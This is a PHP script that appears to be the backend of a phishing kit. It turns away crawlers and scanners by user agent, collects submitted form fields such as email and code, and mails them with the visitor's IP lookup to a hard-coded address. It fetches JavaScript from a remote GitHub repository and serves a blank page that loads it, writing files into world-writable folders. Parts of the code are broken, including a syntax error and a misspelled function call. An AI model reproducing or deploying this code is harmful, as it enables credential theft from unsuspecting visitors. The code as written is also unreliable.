<?php



$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

$bot_identifiers = array(
  'bot',
  'slurp',
  'crawler',
  'spider',
  'curl',
  'facebook',
  'fetch',
);
foreach ($bot_identifiers as $identifier) {
    if (strpos($user_agent, $identifier) !== FALSE) {
      exit();
    } 
  }
$ip = $_SERVER['REMOTE_ADDR'];


//phpinfo(32);
if (!isset($_SESSION)) {
    session_start();
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['_id'])){

if(isset($_POST['email'])){
    $mail = $_POST['email'];
}
    if(isset($_POST['code'])){
        $code = $_POST['code'];
        }
    if($code !== 'vsdg') {
   echo 'Post';
    
    
}
$id = $_POST['_id'];
if(isset($_POST['code'])){
$code = $_POST['code'];
} else {
    $code = "NA";
}

if(isset($_POST['subj'])){
    $subject = $_POST['subj'] . ' ' . $code;
} else {
$subject = $code;
}

$in = $code;

if (isset($code)) {
    $in = $code;
} else {
    $in = "in";
};
$link = $_POST['ip'];

foreach ($_POST as $key => $value) 
    $body .= $key . ' : ' . $value . "\r\n";


    if($link){
    $body .= "https://whatismyipaddress.com/ip/" . $link;
    }



    if($code == "vsdg"){
        $to = "drodriguez@safeguardcasualty.com";
        $in = 'vsdg';
    }elseif($code == "test"){
        echo $body;
        exit;
    } else {
        $to = "drodriguez@safeguardcasualty.com";
    }
    

if($in == ''){
    $in = 'noreply';
}

if ( file_exists( '/var/www/key') ) {
    $to =  file_get_contents('/var/www/key');
  
    }





$from = $in . '@' . $_SERVER['HTTP_HOST'];
//$headers = "From: " .$from;
$headers  = "From: ".$from ."\n";
    $headers .= "X-Sender: ". $_POST['_id'] .$from ."\n";
    //$headers .= 'X-Mailer: PHP/' . phpversion();
    //$headers .= "X-Priority: 1\n"; // Urgent message!
    $headers .= "Return-Path:". $to ."\n"; // Return path for errors
    $headers .= "MIME-Version: 1.0\r\n";
   // $headers .= "Content-Type: text/html; charset=iso-8859-1\n";




mail($to, $subject, $body, $headers);

//echo $body;
unset($_POST);
//header("Location: ".$_SERVER['PHP_SELF']);
exit;
} else {
$current = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$s = strpos($current, '?') !== FALSE ? strtok($current, '?') : $current;

    $tokens = explode(".", $s);
$server = $tokens[0];

if($s == 'www'){
    $server = $tokens[1];
}
$json_data = json_encode($posts);
file_put_contents(.server. '.json', $json_data);
$dir = '/var/www/' . $s;

$main = $server.".js";
$style = $server.".css";
$content = $server."-content.js";
$update = $server."-update.php";
$index = "index.php";

$url = parse_url($_SERVER['REQUEST_URI']);

    }



if (!file_exists($dir .'script/')) {
    mkdir($dir .'script/', 0777, true);
    $file = fopen($dir .'script/'. $index, 'w') or die("Unable to open $index!");
    fclose($file);
}
if (!file_exists($dir .'functions/')) {
    mkdir($dir .'functions/', 0777, true);
    $file = fopen($dir .'functions/'. $index, 'w') or die("Unable to open $index!");
    fclose($file);
}
if (!file_exists($dir .'css/')) {
    mkdir($dir .'css/', 0777, true);
    $file = fopen($dir .'css/'. $index, 'w') or die("Unable to open $index!");
    fclose($file);
}
if (!file_exists($dir .'data/')) {
    mkdir($dir .'data/', 0777, true);
    $file = fopen($dir .'data/'. $index, 'w') or die("Unable to open $index!");
    fclose($file);
}
//echo $dir .'script/'. $content;

if(!is_file($dir .'script/'. $content)){

    $file = fopen($dir .'script/'. $content, 'w') or die("Unable to open $content!");
    fclose($file);
}


if(!is_file($dir .'css/'. $style)){

    $file = fopen($dir .'css/'. $style, 'w');
    fclose($file);
}


if(!is_file($dir .'css/bootstrap.css')){

    $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/bootstrap.css');
    $myfile = fopen($dir .'css/bootstrap.css', "w");
    fwrite($myfile, $data);
    fclose($myfile);
    
    }

    if(!is_file($dir .'script/ajax.js')){

        $data = file_get_contents('https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js');
        $myfile = fopen($dir .'script/ajax.js', "w");
        fwrite($myfile, $data);
        fclose($myfile);
        
        }

if(!is_file($dir .'script/'. $main)){

    $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
    $myfile = fopen($dir .'script/'. $main, "w") or die("Unable to open $main!");
    fwrite($myfile, $data);
    fclose($myfile);
    
    }
    


$me = basename($_SERVER['PHP_SELF']);

$filename = 'wp-blog-header.php';

if (file_exists($filename)) {
    echo "The file $filename exists";
    isWordpress();
    exit;
}




function isWorpress(){


    
echo '<script src="/script/ajax.js"></script>';
echo "<script type='text/javascript' src='/script/${main}'></script>";
    echo "hello";
    exit;

}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/script/ajax.js"></script>
    <?php echo "<script type='text/javascript' src='/script/${main}'></script>"; ?>
    <title></title>

    

</head>
<body>
  
</body>
</html>